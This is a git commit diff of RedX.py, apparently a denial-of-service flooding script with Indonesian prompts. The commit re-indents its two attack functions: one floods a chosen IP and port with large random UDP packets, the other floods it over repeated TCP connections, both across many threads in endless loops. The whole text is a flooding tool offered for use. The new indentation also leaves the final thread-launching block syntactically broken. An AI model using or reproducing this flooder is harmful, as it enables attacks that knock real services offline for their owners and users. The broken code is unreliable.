468ef843b2a6753b0825b3d8aff0674920a265af
Cryspot <94024627+Cryspot@users.noreply.github.com>
2021-11-10 09:46:44 +0700

    Update RedX.py

--- RedX.py
+++ RedX.py
@@ -32,37 +32,37 @@ choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
 times = int(input("DdosAttackByRedX | Packets:"))
 threads = int(input("DdosAttackByRedX | Threads:"))
 def run():
-        data = random._urandom(20480)
-        i = random.choice(("[*]","[!]","[#]"))
-        while True:
-                try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        addr = (str(ip),int(port))
-                        for x in range(times):
-                                s.sendto(data,addr)
-                        print(i +" RedX Menyenggol ")
-                except:
-                        print(" [!] RedX IS HERE DUDE! ")
+    data = random._urandom(20480)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" RedX Menyenggol ")
+        except:
+            print(" [!] RedX IS HERE DUDE! ")
 
 def run2():
-        data = random._urandom(204)
-        i = random.choice(("[*]","[!]","[#]"))
-        while True:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((ip,port))
-                    s.send(data)
-                    for x in range(times):
-                            s.send(data)
-                    print(i +" RedX Menyenggol ")
-                except:
-                        s.close()
-                        print("[*] RedX IS HERE DUDE ")
+    data = random._urandom(204)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +" RedX Menyenggol ")
+        except:
+            s.close()
+            print("[*] RedX IS HERE DUDE ")
 
 for y in range(threads):
-        if choice == 'y':
-                th = threading.Thread(target = run)
-                th.start()
-        else:
-                th = threading.Thread(target = run2)
-                th.start()
+    if choice == 'y':
+    th = threading.Thread(target = run)
+    th.start()
+else:
+    th = threading.Thread(target = run2)
+    th.start()
